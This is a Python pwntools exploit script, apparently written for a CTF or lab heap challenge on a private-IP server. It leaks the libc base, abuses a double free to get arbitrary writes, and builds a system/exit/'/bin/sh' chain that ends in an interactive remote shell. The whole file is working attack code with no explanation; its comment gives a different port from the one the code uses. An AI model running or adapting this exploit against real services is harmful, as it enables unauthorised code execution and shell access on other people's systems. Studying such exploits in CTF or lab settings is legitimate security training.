import pwn

#Remote server at IP 10.21.232.3 and port 10101

proc = pwn.remote('10.21.232.3', 20202)

import struct
import sys

def remove(user: int):
    proc.sendline( "d".encode() )
    proc.sendline( user.encode() )

def add(name: bytes):
    proc.sendline( "g".encode() )
    proc.sendline( name )        
    
def func(): 
    for i in range(1, 8): 
        remove( str(i-1) ) 

    remove( str(7) ) 
    remove( str(8) ) 
    remove( str(7) ) 

    for i in range(7): 
        add(b"ABCD")


done = "x\n"

addr = proc.recvuntil(b'Libc base: ')
addr = proc.recvuntil(b'\n')
addr = addr.decode()
libc_base = addr[:len(addr)-1]
#print("type is: " + str(type(libc_base)))
libc_base_int = int(libc_base, 16)

offset1 = 0x8233d78
write_addr = libc_base_int +  offset1# $ebp + 8; where return address is stored
#write_addr = 0x7fffffffdd78

offset2 = 0x4c920
system = libc_base_int + offset2

offset3 = 0x3ea70
exit = libc_base_int + 0x3ea70

offset4 = 0x19604f
binsh = libc_base_int + 0x19604f

for i in range(9): #[0, 8]
    add(b"ABCD")

func()    
add(struct.pack("<Q", write_addr)) #7 
add(b"ABCD") #8
add(b"ABCD") #7
add(struct.pack("<Q", system)) #overwrite

func()    
add(struct.pack("<Q", write_addr + 8)) #7 
add(b"ABCD") #8
add(b"ABCD") #7
add(struct.pack("<Q", exit)) #overwrite

#proc.sendline("p".encode())

func()    
add(struct.pack("<Q", write_addr + 16)) #7 
add(b"ABCD") #8
add(b"ABCD") #7
add(struct.pack("<Q", binsh)) #overwrite

proc.sendline(done.encode())
proc.interactive()
proc.close()
